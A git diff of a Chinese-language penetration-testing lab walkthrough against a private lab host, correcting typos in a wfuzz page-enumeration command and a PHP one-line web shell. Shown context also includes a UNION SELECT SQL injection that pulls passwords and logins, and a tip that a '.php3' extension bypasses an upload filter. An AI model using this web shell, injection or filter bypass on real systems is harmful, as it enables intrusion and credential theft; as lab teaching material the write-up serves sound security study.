@@ -83,6 +83,7 @@ GET / HTTP/1.1
 ```
 
 返回结果如下：
+
 ![get](image/get.jpg)
 
 nc 尝试连接端口22：
@@ -100,7 +101,7 @@ nc 192.168.55.3 22
  使用 wfuzz 枚举网站下的页面。Kali 自带 wfuzz，wfuzz 也提供了字典，不需要再使用 crunch 生成可用的字典。 输入以下指令：
 
 ```
-wfuzzwfuzz -c -z file,usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.55.3/FUZZ
+wfuzz -c -z file,usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.55.3/FUZZ
 ```
 
 ![wfuzz](image/wfuzz.jpg)
@@ -494,7 +495,7 @@ http://192.168.55.3/cat.php?id=1 UNION SELECT 1,concat(password,'>',id,'>',login
 
 ```php
 <？php 
-  system（$ _ GET ['cmd']）; 
+  system（$_GET['cmd']）; 
 ？>
 ```
 
@@ -504,7 +505,6 @@ http://192.168.55.3/cat.php?id=1 UNION SELECT 1,concat(password,'>',id,'>',login
 
 ```
 No PHP!!
-
 ```
 
 -  `php3`  这将绕过一个简单的过滤器 `.php`
